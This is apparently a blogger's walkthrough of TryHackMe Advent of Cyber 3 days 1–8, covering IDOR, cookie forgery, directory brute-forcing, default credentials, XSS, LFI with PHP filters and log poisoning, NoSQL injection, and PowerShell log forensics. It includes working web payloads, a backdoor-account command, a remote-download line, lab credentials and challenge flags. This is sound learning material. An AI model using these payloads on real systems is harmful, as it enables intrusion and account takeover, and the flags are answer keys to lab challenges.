## Try Hack Me: Advent of Cyber 3

I was so excited to find out about this event from [TryHackMe](). Once I heard about it, I couldn't wait to get started. Each day will be posted to my blog as I go.

### [The Christmas Story]
*All exercises in Advent of Cyber follow a fun Christmas story. This year, the elf McSkidy needs your help to hack back and undo the grinch's malicious activities.*

<Image wide src="../../static/img/AoC3/theCyber-Security_Elves_That_Saved_Christmas.png" />

> It's the eve of 30th November - McSkidy sits in her large office with a cup of hot cocoa, reminiscing over her stressful times at the Best Festival Company. Since her management of the Christmas Monster's cyber attacks last December, she'd been promoted to Chief Information Security Office (CISO) and has managed to build a world-class security team. She made a promise to never let Christmas get affected by cyber incidents and has done everything in her power to prepare the best festival company for any incidents, and assist Santa in delivering presents globally with no disruptions!
> 
> As she grins to herself "After all we've done, what could go wrong", Elf McAssistant runs into her office and gasps "All our security analysts have missed their last shift and no security personnel can be found in the building". McSkidy jumps out of her chair and spills her hot cocoa all over herself "WHAT".
> 
> She swiftly moves over to the Elf Security Center housing the security personnel and looks over the large area filled with empty desks. Where did everyone go on the eve of the most important time for the Best Festival Company. She rushes over to the desk of the head of her security analyst team, Elf McLeader, and notices the desk is surprisingly clean. For someone so messy, how is his work area completely empty? As she started theorising in her head, she noticed a small piece of paper hidden at the back of the desk behind the screen. As she made sense of what was on the paper, her eyes widened - why did McProfessional book a one-way flight ticket away on this exact day!
> 
> Before she had time to make any assumptions, a loud, grumpy voice was resonating across the security center from the internal announcement systems "Grinch Enterprises will never let Christmas succeed. It would be a shame if your world-class security team just suddenly disappeared"
> 
> "THIS WAS ALL PLANNED - HOW DID THEY ACCESS OUR INTERNAL SYSTEMS" cried McSkidy. Their intelligence team had prepared for this exact scenario but it didn't help that the security center was completely empty!
> 
> "This needs to stop happening" sighed McSkidy and dragged herself to the office to save Christmas
> 
> Please note, tasks are released daily and will vary in difficulty (although will always be aimed at a beginner level)

## [Day 1] `Web Exploitation` Save The Gifts
The inventory management systems used to create the gifts have been tampered with to frustrate the elves. It's a night shift, and McStocker comes to McSkidy panicking about the gifts all being built wrong. With no managers around to fix the issue, McSkidy needs to somehow get access and fix the system and keep everything on track to be ready for Christmas!
</br>
I read through the learning objectives and the lesson to learn about `IDOR vulnerabilities` and how to find and exploit them. We have the option to watch [`John Hammond`'s video](https://www.youtube.com/watch?v=858rVeWB8Pw) walkthrough and/or get started on the questions:

## Questions
### 1. After finding Santa's account, what is their position in the company?
So when we click `View Site` at the top right, and we go to the `Your Activity` page, as McSkidy our `user_id=11`, and we need to change that in order to be recognized as a different user. Logically, let's try `user_id = 0 or 1` first. Using the 0, we get a `User Not Found` error. 1 gives us Santa! 
#### Flag
We can see that Santa's position is `The Boss!`

### 2. After Finding McStocker's account, what is their position in the company?
Let's keep incrementing the `user_id`. 2 gives another `User Not Found`, and `McStocker` is user 3.
#### Flag
McStocker's position is `Build Manager`.

### 3. After finding the account responsible for tampering, what is their position in the company?
Ascending in user ids, 4, 5, 6, 7, and 8 are all `User Not Found`, but `user_id=9` is the `Grinch`!
#### Flag
The Grinch's position is `Mischief Manager`.

### 4. What is the received flag when McSkidy fixes the Inventory Management System?
Let's `Revert` all of the Grinch's Actions! 
After doing that, a pop-up message of McSkidy with the text: `McSkidy has fixed the Inventory Management System!` with the flag below.
#### Flag
`THM{AOC_IDOR_2B34BHI3}`

### 5. If you want to learn more about IDOR vulnerabilities, we suggest trying out this room https://tryhackme.com/room/idor
#### Flag
`No answer needed`

### 6. Tasks released each day get progressively harder (but are still guided with walkthrough videos). Come back tomorrow for Day 2's task!
#### Flag
`No answer needed`

## [Day 2] `Web Exploitation` Elf HR Problems
McSkidy needs to check if any other employee elves have left/been affected by Grinch Industries attack, but the systems that hold the employee information have been hacked. Can you hack them back to determine if the other teams in the Best Festival Company have been affected?

After reading through the story and the lesson on `HTTP(S)` and `Cookies` and possibly watching [`John Hammond`'s video' walkthrough](https://www.youtube.com/watch?v=8XYtpv-3-No), let's get to the questions.

## Questions
### 1. Open the static site in a new tab, [here](https://static-labs.tryhackme.cloud/sites/aoc-cookies/).
#### Flag
`No answer needed`

*Register an account, and verify the cookies using the Developer Tools in your browser.*
### 2. What is the name of the new cookie that was created for your account?
Let's create our account and see what cookie was created. Before we submit to create the account, we make sure the `Chrome Developer Tools` are open to the Cookies tab. When submitted we can see the new `user-auth` cookie. 
#### Flag
`user-auth`

### 3. What encoding type was used for the cookie value?
The value I got was: `7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a224c7562227d`, which to me looks like hexadecimal, and when I check an [Online Hex Decoder](https://cryptii.com/pipes/hex-decoder), it turns out true.
#### Flag
`hexadecimal`

### 4. What object format is the data of the cookie stored in?
When I input the value of the cookie into the decoder, it outputs this: `{company: "The Best Festival Company", isregistered:"True", username:"Lub"}`
Which is json format.
#### Flag
`json`

*Manipulate the cookie and bypass the login portal.*
### 5. What is the value of the administrator cookie? (username = admin)
To manipulate the cookie, I changed the username `Lub` in `{company: "The Best Festival Company", isregistered:"True", username:"Lub"}`, to `admin`, so `{company: "The Best Festival Company", isregistered:"True", username:"admin"}`, I rerun that through to encode it as hexadecimal which gives me `7b 63 6f 6d 70 61 6e 79 3a 20 22 54 68 65 20 42 65 73 74 20 46 65 73 74 69 76 61 6c 20 43 6f 6d 70 61 6e 79 22 2c 20 69 73 72 65 67 69 73 74 65 72 65 64 3a 22 54 72 75 65 22 2c 20 75 73 65 72 6e 61 6d 65 3a 22 61 64 6d 69 6e 22 7d`. 
#### Flag
So I can take all the spaces out and I get: `7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d`.

### 6. What team environment is not responding?
In the developer tools, I put that last flag into the value of the `user-auth` cookie and finally refresh the page to set the cookie in action. Which gives us this page:
<Image />
#### Flag
We can see that the team environment with the red indicator is `HR`.

### 7. What team environment has a network warning?
#### Flag
From the above image, we can see that the yellow indicator is on `Application`.

### 8. If you want to learn more about Authentication bypasses, we suggest trying out this room https://tryhackme.com/jr/authenticationbypass  
#### Flag
`No answer needed`

### 9. Tasks released each day get progressively harder (but are still guided with walkthrough videos). Come back tomorrow for Day 3's task, where InsiderPHD will be recording a video walkthrough!
#### Flag
`No answer needed`

## [Day 3] `Web Exploitation` Christmas Blackout
Grinch Enterprises have also tried to block communication between anyone at the company. They've locked everyone out of their email systems and McSysAdmin has also lost access to their admin panel. Can you find the admin panel and help restore communication for the Best Festival Company.

While reading through the lesson, we are told: *In today's task, we're going to be using our investigatory skills and techniques to discover un-listed content, and attempt some common authentication using the clues around us.*

I'll go ahead and get both the `Attack Box` and the `Vulnerable Machine` up and running. After reading through the lesson about `Content Discovery` and `Authentication Bypass`, and possibly watching [`InsiderPHD`'s walkthrough video](https://www.youtube.com/watch?v=8dUylKcDUvU), we can start the questions.

## Questions
### 1. Using a common wordlist for discovering content, enumerate http://10.10.83.31 to find the location of the administrator dashboard. What is the name of the folder?
Okay, the `AttackBox` shows Usage Instructions: `Tools`, `Webshells`, `Wordlists`, and tools called `Empire` & `Starkiller`. For this question, we need the wordlists which are shown to be located in `/usr/share/wordlists`. We also just learned about the tool called `Dirbuster` with the command `dirb`, which can brute force directories and files names on web/application servers. Within the attack box, I'm going to try the following command:
```console
dirb http://10.10.83.31 /usr/share/wordlists/rockyou.txt
```
That one was taking so long that I looked at the `Hint` for this question. It told me: "I recommend using the "common.txt" wordlist located at /usr/share/wordlists/dirb/ on the THM AttackBox. When running your dirbuster command, you can provide the "-r" option to tell dirbuster to not be recursive, resulting in a faster search."</br>
So I instead ran:
```console
dirb http://10.10.83.31 /usr/share/wordlists/dirb/common.txt
```
Which ran so much faster because it apparently only contains 4612 words. That makes sense since `rockyou.txt` has a few million I'm pretty sure. The flag easily happens to be `admin`...
#### Flag
`admin`

### 2. In your web browser, try some default credentials on the newly discovered login form for the "`administrator`" user. What is the password?
Okay, so I navigate to `http://10.10.61.141/admin` which gives a simple admin login screen. I'll try some default credentials that I can think of:
`administrator`:`password` -> Incorrect
`administrator`:`password123` -> Incorrect
`administrator`:`letmein123` -> Incorrect
`administrator`:`administrator` -> Correct!

#### Flag
The password is `administrator`.

### 3. Access the admin panel. What is the value of the flag?
#### Flag
When the page loads up, at the bottom, the flag is `THM{ADM1N_AC3SS}`.

---

## [Day 4] `Web Exploitation` Santa's Running Behind
McSysAdmin managed to reset everyone's access except Santa's! Santa's expected some urgent travel itinerary for his route over Christmas. Rumour has it that Santa never followed the password security recommendations. Can you use bruteforcing to help him access his accounts?

After reading through the lesson about `Fuzzing`, `Burp Suite`, and how to use it for fuzzing a login form; we can watch [`Nahamsec`'s Walkthrough Video](https://www.youtube.com/watch?v=jT8-HE95G5Q) before or after completing the following questions.

## Questions
### 1. Access the login form at http://10.10.83.31
#### Flag
After going to the login form, we can click *Submit* for `No answer needed`.

### 2. Configure Burp Suite & Firefox, submit some dummy credentials and intercept the request. Use intruder to attack the login form.
We can configure Burp Suite & Firefox by, intercepting the traffic to the login form, sending the data we got returned to us from the dummy data we submitted to the `Intruder`, adding the username and password parameters as the two positions, set the first position to be `santa` and the second position we can use the [file](https://assets.tryhackme.com/additional/aoc2021/day4/passwords.txt) they provided, and use the cluster bomb attack.
#### Flag 
`No answer needed`

### 3. What valid password can you use to access the "santa" account?
We can see that all the passwords came with a status code of 200, whereas the combination `santa`:`cookie` gave back 302, Found.
<Image wide src="../../static/img/AoC3/Day4-Q3-santas_pass.png" />
#### Flag
So the password is `cookie`.

### 4. What is the flag in Santa's itinerary?
I can now log in as santa and at the top of the page is the flag.
#### Flag
`THM{SANTA_DELIVERS}`

## [Day 5] `Web Exploitation` Pesky Elf Forum
The Elf Forum is where all the elves express their joy and excitement about Christmas, but Grinch Enterprises has one bad admin account, and they've installed a plugin that changes all mentions of Christmas to Buttmas!! McSkidy needs to find that admin account and disable the plugin.

After reading through the lesson about `XSS vulnerabilities`, I can start the questions and either watch [`Nahamsec`'s walkthrough video](https://www.youtube.com/watch?v=uA1OHCgArzI) before or after.

## Question
### 1. What flag did you get when you disabled the plugin?
For this one, we need to follow along with the `Challenge Walkthrough`. It tells me to login at the link at the top of the page, with these credentials:</br>
`Username:`**`McSkidy`**</br>
`Password:`**`password`**</br>
It then tells me to go to the `Settings` and change `McSkidy's` password to `pass123`. On submitting, the url changes to `https://10-10-111-108.p.thmlabs.com/settings?new_password=pass123`</br>
It tells me to head to a forum and type a comment saying `hello <u>world</u>`, which outputs 'hello world' with the word 'world' being underlined. Which means that the comments are not stripping out HTML tags from the user input.</br>
The walkthrough tells us to comment again with `<script>fetch('/settings?new_password=pass123');</script>`. After commenting that, we wait until the grinch has possibly visitted that page, then we logout, and login with:</br>
`Username:`**`grinch`**</br>
`Password:`**`pass123`**</br>
It worked! Since we're logged in as the grinch, we head to the `Settings` again and we can find a plugin which is changing the word `Christmas` to `Buttmas` in the Elf Forum. After I(McSkidy) Disable the plugin, a box is displayed saying `Brilliant, the plugin has been disabled and joy has been restored to the forum! THM{NO_MORE_BUTTMAS}`</br>
There's the flag!

#### Flag
`THM{NO_MORE_BUTTMAS}`

---

## [Day 6] `Web Exploitation` Patch Management Is Hard
During a routine security audit before the Incident, McSkidy discovered some recovery passwords on an old server. She created a ticket to decommission this server to reduce this security vulnerability. The Elf assigned to fix this vulnerability kept pushing off the task, and this never got done. Luckily, some of those recovery keys can be used to save some systems.

Unfortunately, the only way to access the server is through an old web application. See if you can pull out those recovery keys to help McSkidy with her pursuit to save Christmas.
</br>
After reading through the lesson about `Local File Inclusion(LFI) vulnerabilities`, learning about `PHP Filters`, and either watching [`HuskyHacks`'s walkthrough video](https://www.youtube.com/watch?v=pGPE5uCI5h8) before or after the questions: 

## Questions
### 1. Deploy the attached VM and look around. What is the entry point for our web application?
For this one, they say above that '*An entry point could be HTTP GET  or POST  parameters that pass an argument or data to the web application to perform a specific operation.*'
So I see in the URL: `https://10-10-5-3.p.thmlabs.com/index.php?err=error.txt`.
#### Flag
The entry point is `err`.

### 2. Use the entry point to perform `LFI` to read the `/etc/flag` file. What is the flag?
I was doing this wrong at first, I was following their examples of `http://example.thm.labs/page.php?file=/etc/passwd` but my url was `https://10-10-5-3.p.thmlabs.com/index.php?file=/etc/flag`, I didn't know that I needed to leave the `?err=` there instead of `?file=`. So I eventually started appending `../` one by one to `etc/flag` with the whole url ending up looking like `https://10-10-5-3.p.thmlabs.com/index.php?err=../../../../../etc/flag` to finally get the flag.
#### Flag
`THM{d29e08941cf7fe41df55f1a7da6c4c06}`

### 3. Use the PHP filter technique to read the source code of the `index.php`. What is the `$flag` variable's value?
For this one, I'm going to try to run the `err=` the filter that they give for `base64`, so `https://10-10-27-217.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=/index.php`. That gives a Warning but shows where the operation failed in, `/var/www/html/index.php`, so I'll just run `https://10-10-27-217.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=/var/www/html/index.php` instead.
I get `PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8`. Let's go [decode](https://www.base64decode.org/) that. Pasting that in and decoding it, I get:
```php
<?php session_start();
$flag = "THM{791d43d46018a0d89361dbf60d5d9eb8}";
include("./includes/creds.php");
if($_SESSION['username'] === $USER){                        
	header( 'Location: manage.php' );
	die();
} else {
	$labNum = "";
  require "./includes/header.php";
?>
<div class="row">
  <div class="col-lg-12">
  </div>
  <div class="col-lg-8 col-offset-1">
      <?php if (isset($error)) { ?>
          <span class="text text-danger"><b><?php echo $error; ?></b></span>
      <?php }

?>
 <p>Welcome <?php echo getUserName(); ?></p>
	<div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div> 
	</div>
<?php if($errInclude){ include($_GET['err']);} ?>
</div>

<?php
}
?>
```
#### Flag
Right there at the top of the `php` code is the `$flag = THM{791d43d46018a0d89361dbf60d5d9eb8};`

*McSkidy forgot his login credential. Can you help him to login in order to recover one of the server's passwords?*
### 4. Now that you read the `index.php`, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?
It's telling us that at the top of the `php` code there is an `include("./includes/creds.php");`, Let's see what is inside this `php` file with that same `PHP filter technique`. We'll put `https://10-10-27-217.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php` as the url. We got another string of base64, `PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/`. Let's [decode](https://www.base64decode.org/) this one as well:
```php
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
?
```
#### Flag
`McSkidy:A0C315Aw3s0m`

### 5. Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the `flag.thm.aoc` server? 
Okay, so we head back to the base url and click `Sign in`. Then enter the username and password to McSkidy's account. That gives us access to the `McSys Control System`.</br>
Let's click `password recovery`. There's the flag! 
#### Flag
The password for the `flag.thm.aoc server` is `THM{552f313b52e3c3dbf5257d8c6db7f6f1}`

### 6. The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at `./includes/logs/app_access.log`.
If we follow some of the walkthrough above, we can include a custom `User-Agent value` with `curl` in the `terminal`. It says we can use `curl -A "<?php phpinfo();?>" http://10-10-9-205.p.thmlabs.com/login.php`, I'll run that, refresh the page that we have access with `McSkidy`'s account. In the System Logs, we get an updated access log with `Guest:172.17.0.1::/login.php` added. Let's then use a fresh, unlogged in Window and input `https://10-10-9-205.p.thmlabs.com/index.php?err=./includes/logs/app_access.log` as the url. Which gives us a long list of php information.
<Image wide src="#"/>
We can press `Ctrl + F` to search for 'hostname' by typing that in and searching for something that might be it. At `hostname occurance 2/4` we see:
<Image wide src="../../static/img/hostnameFound.png" />
#### Flag
Which gives the HOSTNAME | `lfi-aoc-awesome-59aedca683fff9261263bb084880c965`.

### 7. **Bonus:** The current PHP configuration stores the PHP session files in `/tmp`. Use the LFI to call the PHP session file to get your PHP code executed. 
#### Flag
`No answer needed`

## [Day 7] `Web Exploitation` Migration Without Security
The development team that handles gift requests from Children migrated over to a new technology stack. In doing so, they left their application vulnerable, and Grinch Enterprises now controls access to the system. Fortunately, Grinch enterprises forgot to patch the system so you can use the same vulnerability to retrieve the gift requests for the students.

After reading through the stuff about understanding `NoSQL`, `MongoDB`, and `NoSQL Injection`, and possibly watching [`Tib3rius`' Video](https://www.youtube.com/watch?v=Fmw8ia0sMEc), I can get started on the questions.
For some reason my ssh client wasn't connecting to the machine. When running the ssh command with `-v`, I saw it was getting hung on something like `debug1: expecting SSH2_MSG_KEX_ECDH_REPLY`. I looked it up and found out I need to add "*Add `KexAlgorithms ecdh-sha2-nistp521` to the corresponding SSH config, or add `-oKexAlgorithms=ecdh-sha2-nistp521` to the command line args for one time use.*"([From here](https://askubuntu.com/questions/1229456/ssh-fails-with-connection-timed-out-in-vpn-and-hangs-here-expecting-ssh2-msg))

## Questions
### 1. Interact with the MongoDB server to find the flag. What is the flag?
After figuring out the issue I had with ssh, I got into the machine and ran `mongo` to connect to `MongoDB`.</br>
Now we can check which databases mongo has:
```mongo
> show databases
admin   0.000GB
config  0.000GB
flagdb  0.000GB
local   0.000GB
```
Let's switch to the `flagdb`:
```mongo
> use flagdb
switched to db flagdb
> db
flagdb
```

Now using the following information about `MongoDB`:
"*Similar to relational databases (such as MySQL and MSSQL), MongoDB consists of databases, tables, fields but with different names where *
- *Collections are similar to tables or views in MySQL and MSSQL.*
- *Documents are similar to rows or records in MySQL and MSSQL.*
- *Fields are similar to columns in MySQL and MSSQL.
 let's see what collections*"
I can try to see what collections are inside `flagdb`:
```mongo
> show collections
flagColl
```
Now let's see what is inside of the `flagColl` collection:
```mongo
> db.flagColl.find()
{ "_id" : ObjectId("618806af0afbc09bdf42bd6a"), "flag" : "THM{8814a5e6662a9763f7df23ee59d944f9}" }
```
#### Flag
`THM{8814a5e6662a9763f7df23ee59d944f9}`

### 2. We discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as `admin` and retrieve the flag?

*Use the knowledge given in AoC3 day 4 to setup and run Burp Suite proxy to intercept the HTTP request for the login page. Then modify the POST parameter.*
<Image wide src="../../static/img/day7-ImageIncludedInQuestion.png" />
Let's open up BurpSuite and start FoxyProxy to capture the HTTP requests to the login page. I intercepted the POST request, sent it to the `Repeater`, then I added `[$ne]` between the `password` and the `=admin`. I pressed `Send` to continue sending the modified request, and reloaded the login page which gives me access to the admin dashboard! I click on the `Flag!` option to get the flag.
#### Flag
`THM{b6b304f5d5834a4d089b570840b467a8}`

### 3. Once you are logged in, use the gift search page to list all usernames that have `guest` roles. What is the flag?
We go back to the dashboard and instead of `Flag!`, we choose `Search`. If I enter in `santa` into the Username search bar, the url changes to this `http://10.10.90.250/search?username=santa&role=user` and the webpage displays `Username not found!` I believe we found an entry point! Let's try to use the same `[$ne]` injection into the url. So I'll change the url to be `http://10.10.90.250/search?username[$ne]=santa&role=user`. That returns all the usernames! But I forgot we need to search for all the users that have `guest` roles, so we'll just change the url to `http://10.10.90.250/search?username[$ne]=santa&role=guest`
#### Flag
That url gives me three usernames, the last one being: </br>
ID:61850fb42f70bd35768c82f2:`THM{2ec099f2d602cc4968c5267970be1326}`:guest

### 4. Use the gift search page to perform NoSQL injection and retrieve the `mcskidy` record. What is the details record?
Again, in the url, we'll just have to change the username to `mcskidy` and I'm sure McSkidy is an `admin`.
So with this as the url: `http://10.10.90.250/search?username=mcskidy&role=admin`, we get the details to the `mcskidy` username.
#### Flag
`ID:6184f516ef6da50433f100f4:mcskidy:admin`

## [Day 8] `Special by John Hammond` Santa's Bag of Toys
McSkidy was notified of some terrible news! Santa's laptop, which he uses to prepare his bag of toys for Christmas, is missing! We believe a minion at the Grinch Enterprise stole it, but we need to find out for sure. It is up to us to determine what actor compromised the laptop and recover Santa's bag of toys!

Unfortunately, The Best Festival Company had minimal monitoring tools on Santa's laptop (he is the boss, after all)! All we have to work with are some PowerShell Transcription Logs we were able to remotely recover just after it went missing.</br>
...</br>
...</br>
**Note that for this task, you will interact with a Windows virtual machine to perform your analysis. For the sake of storyline, this is not Santa's laptop... rather, you have sample files that were recovered before the laptop was stolen.**


## Questions


### 1. Read the premise above, start the attached Windows analysis machine and find the transcription logs in the `SantasLaptopLogs` folder on the Desktop. (***If you want to RDP into the machine, start the AttackBox and enter the following into a terminal: xfreerdp /u:Administrator /p:grinch123! /v:10.10.98.115 - The credentials for the machine are Administrator as the username, and grinch123! as the password.***)
#### Flag
After opening up the 'SantasLaptopLogs' folder in the Desktop folder, `No answer needed`.

**Each transcription log is a simple plain text file that you can open in any editor of your choice. While the filenames are random, you can get an idea as to which log "comes first" by looking at the Date Modified or Date Created attributes, or the timestamps just before the file extension!**

**Open the first transcription log. You can see the commands and output for everything that ran within PowerShell, like `whoami` and `systeminfo`!**
### 2. What operating system is Santa's laptop running("OS Name")?
I just found the earliest created out of the five files and opened it, it contains a bunch of information about the PowerShell I think, I can just find the operating system.
#### Flag
It is `Microsoft Windows 11 Pro`

***Review each transcription log to get an idea for what activity was performed on the laptop just after it went missing. In the "second" transcription log, it seems as if the perpetrator created a backdoor user account!***
### 3. What was the password set for the new "backdoor" account?
Since the only command in the first file was `net user`, let's check the second log file. The first command run is adding a `net user`.
```console
PS C:\Windows\system32> net user s4nta grinchstolechristmas /add
```
#### Flag
So then the user is 's4nta' with the password as `grinchstolechristmas`.

### 4. In one of the transcription logs,  the bad actor interacts with the target under the new backdoor user account, and copies a unique file to the Desktop. Before it is copied to the Desktop, **what is the full path of the original file?**
#### Flag
In the third transcription log, the third command down is 'copy `C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat`'

### 5. The actor uses a [Living Off The Land](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) binary (LOLbin) to encode this file, and then verifies it succeeded by viewing the output file. **What is the name of this LOLbin?**
#### Flag
Going down a little further in the third transcription log, we can find where the bad actor uses '`certutil.exe` -encode .\UsrClass.dat santa.dat'.

### 6. Read the above and open the `ShellBagsExplorer.exe` application found in the folder on your Desktop.
#### Flag
`No answer needed`.

### 7. Drill down into the folders and see if you can find anything that might indicate how we could better track down what this SantaRat really is. **What specific folder name clues us in that this might be publicly accessible software hosted on a code-sharing platform?**
#### Flag
As I look through the files in the SantaRat folder within `ShellBags Explorer`, I see a `.github` folder.

### 8. Additionally, there is a unique folder named "Bag of Toys" on the Desktop! This must be where Santa prepares his collection of toys, and this is certainly sensitive data that the actor could have compromised. **What is the name of the file found in this folder?**
#### Flag
Still within 'ShellBags Explorer', we can go inside the "Bag of Toys" folder and find the file named `bag_of_toys.zip`.


***It then tells me to track down the software on Github***
### 9. What is the name of the user that owns the SantaRat repository?
#### Flag
When I search for 'santarat' on Github, I found a repository at [https://github.com/Grinchiest/SantaRat](https://github.com/Grinchiest/SantaRat), so the flag is `Grinchiest`.

### 10. Explore the other repositories that this user owns. **What is the name of the repository that seems especially pertinent to our investigation?**
#### Flag
Clicking on 'Grinchiest' to view his profile, we can then see three repositories: 'SantaRat'(the repo that we started with), '`operation-bag-of-toys`'(The flag), 'SantaRatTemplate'.

### 11. Read the information presented in this repository. It seems as if the actor has, in fact, compromised and tampered with Santa's bag of toys! You can review the activity in the transcription logs. It looks as if the actor installed a special utility to collect and eventually exfiltrate the bag of toys. **What is the name of the executable that installed a unique utility the actor used to collect the bag of toys?**
#### Flag 
If I go back to the logs, and look at the fourth log(the one after the big certutil.exe output), we can find a line with '(New-Object Net.WebClient).DownloadFile("https://sam.gleske.net/uharc/uharc-cmd-install.exe", "C:\Users\s4nta\Desktop\uharc-cmd-install.exe")', so it looks like the executable file is `uharc-cmd-install.exe`.


***In the last transcription log, you can see the activity that this actor used to tamper with Santa's bag of toys! It looks as if they collected the original contents with a UHA archive. A [UHA](https://fileinfo.com/extension/uha) archive is similar to a ZIP or RAR archive, but faster and with better compression rates. It is very rare to see, but it looks the Grinch Enterprises are pulling out all the tricks!***
***You can see the actor compressed the original contents of the bag of toys with a password. Unfortunately, we are unable to see what the specific password was in these transcription logs! Perhaps we could find it elsewhere...***
### 12. Following this, the actor looks to have removed everything from the bag of toys, and added in new things like coal, mold, worms, and more!  **What are the contents of these "malicious" files (coal, mold, and all the others)?**
In the last transcription log, we can see a few commands being sent out to `echo "GRINCHMAS"` into the different files within the `Bag of Toys`.
#### Flag
`GRINCHMAS`

### 13. We know that the actor seemingly collected the original bag of toys. Maybe there was a slight OPSEC mistake, and we might be able to recover Santa's Bag of Toys! Review the actor's repository for its planned operations... maybe in the commit messages, we could find the original archive and the password!
#### Flag
This one just tells us to go search in the past commits on Github. The [second commit](https://github.com/Grinchiest/operation-bag-of-toys/commit/41615462e4fdc0ceeb4ef1bec693ec3de1125ed2) in the repo is `stole Santa's bag of toys!!!!!!!!!!!!!!`.

### 14. **What is the password to the original bag_of_toys.uha archive?** (You do not need to perform any password-cracking or bruteforce attempts)
#### Flag
While in the past commits, that second commit contains a file that was probably the stolen bag of toys with the commit message of 'pw: `TheGrinchiestGrinchmasOfAll`'.


*McSkidy was able to download and save a copy of the `bag_of_toys.uha` archive, and you have it accessible on the Desktop of the Windows analysis machine. After uncovering the password from the actor's GitHub repository, you have everything you need to restore Santa's original bag of toys!!*

*Double-click on the archive on the desktop to open a graphical UHARC extraction utility that has been prepared for you. Using the password you uncovered, extract the contents into a location of your choosing (you might make a "Bag of Toys" directory on the Desktop to save all the files into).*

*With that, you have successfully recovered the original contents of Santa's Bag of Toys! You can view these in the Windows Explorer file browser to see how many were present.*

### 15. How many original files were present in Santa's Bag of Toys?
When I open the `bag_of_toys.uha` and input the password `TheGrinchiestGrinchmasOfAll`, It extracts the archive of the toys and shows all the files within.
#### Flag
The total number of files is `228`.
